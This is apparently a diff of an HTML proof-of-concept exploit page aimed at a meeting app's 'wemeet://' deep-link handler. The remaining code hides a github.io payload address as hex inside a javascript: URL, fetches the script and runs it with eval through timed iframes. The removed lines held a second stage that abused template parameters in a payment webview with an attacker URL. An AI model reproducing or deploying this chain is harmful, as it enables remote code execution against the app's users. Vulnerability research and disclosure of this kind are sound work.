@@ -1,10 +1,9 @@
 <!doctype html>
 <html><head><meta charset="utf-8"><title>P91</title></head>
-<body><h1>P91</h1>
+<body><h1>P91 Avatar internal navigation</h1>
 <script>
 document.title='P91-START';
 var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
-var atk='https://gitwhs.github.io/wm-poc-rce/p91tpl.html';
 var tbjs="javascript:void(function(){var h='68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f7039317061792e6a73';var u='';for(var i=0;i<h.length;i+=2)u+=String.fromCharCode(parseInt(h.substr(i,2),16));fetch(u).then(function(r){return r.text()}).then(eval)})()";
 function frame(src,label){
   document.title=label;
@@ -12,24 +11,7 @@ function frame(src,label){
   f.src=src;
   document.body.appendChild(f);
 }
-setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P91-TBOFF'); }, 900);
-setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(tbjs),'P91-TBJS'); }, 1800);
-setTimeout(function(){
-  var q='url='+encodeURIComponent(official)+
-    '&use_template=true'+
-    '&template_url='+encodeURIComponent(official)+
-    '&template_webview_data='+encodeURIComponent(official)+
-    '&ai_thought_use_template_webview=true';
-  frame('wemeet://page/pay/main_process_webview?'+q,'P91-MAINOFF');
-}, 36000);
-setTimeout(function(){
-  var q='url='+encodeURIComponent(atk)+
-    '&use_template=true'+
-    '&template_url='+encodeURIComponent(atk)+
-    '&template_webview_data='+encodeURIComponent(atk)+
-    '&ai_thought_use_template_webview=true';
-  frame('wemeet://page/pay/main_process_webview?'+q,'P91-MAINATK');
-}, 44000);
-setTimeout(function(){ document.title='P91-WAIT'; }, 90000);
-</script>
-</body></html>
+setTimeout(function(){frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P91-TBOFF');},900);
+setTimeout(function(){frame('wemeet://page/web_app?url='+encodeURIComponent(tbjs),'P91-TBJS');},1800);
+setTimeout(function(){document.title='P91-WAIT';},90000);
+</script></body></html>
